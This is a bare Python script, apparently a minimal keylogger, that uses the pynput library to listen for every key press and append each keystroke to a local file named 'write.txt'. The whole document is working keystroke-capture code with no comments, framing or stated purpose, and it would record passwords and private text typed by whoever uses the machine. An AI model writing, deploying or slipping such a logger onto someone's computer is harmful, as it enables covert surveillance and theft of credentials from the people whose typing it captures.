from pynput.keyboard import Listener
    
def writeofile(key):
    letter=str(key)
    letter=letter.replace("'","")
    with open("write.txt","a") as f:
        f.write(letter)

with Listener(on_press=writeofile) as l:
    l.join()